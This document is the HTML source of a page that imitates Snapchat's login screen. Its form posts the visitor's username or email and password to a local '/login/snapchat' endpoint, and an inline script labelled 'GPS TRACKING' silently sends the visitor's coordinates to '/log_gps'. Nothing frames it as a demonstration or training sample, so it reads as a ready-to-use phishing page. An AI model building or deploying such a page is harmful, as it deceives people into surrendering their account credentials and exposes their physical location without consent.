<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat - Log In</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            background-color: #FFFC00;
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .card {
            background: #fff;
            width: 320px;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
            text-align: center;
        }

        /* CSS GHOST LOGO */
        .ghost-css {
            width: 60px;
            height: 60px;
            background: #000;
            margin: 0 auto 20px;
            border-radius: 30px 30px 5px 5px;
            position: relative;
        }

        h2 {
            font-size: 22px;
            font-weight: 800;
            margin-bottom: 25px;
        }

        .label-v {
            display: block;
            text-align: left;
            font-size: 11px;
            font-weight: 700;
            color: #767676;
            text-transform: uppercase;
            margin-bottom: 5px;
            margin-left: 10px;
        }

        input {
            width: 100%;
            padding: 12px 20px;
            margin-bottom: 15px;
            background: #f7f7f7;
            border: 1px solid #e1e1e1;
            border-radius: 25px;
            outline: none;
        }

        button {
            width: 100%;
            padding: 14px;
            background: #000;
            color: #fff;
            font-weight: 700;
            border-radius: 25px;
            cursor: pointer;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="ghost-css"></div>
        <h2>Log In</h2>
        <form id="scForm" action="/login/snapchat" method="POST">
            <span class="label-v">Username or Email</span>
            <input type="text" name="user" required>
            <span class="label-v">Password</span>
            <input type="password" name="pass" required>
            <button type="submit">Log In</button>
        </form>
    </div>

    <script>
        // GPS TRACKING
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(p) {
                fetch('/log_gps', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ lat: p.coords.latitude, lon: p.coords.longitude })
                });
            });
        }
    </script>
</body>
</html>
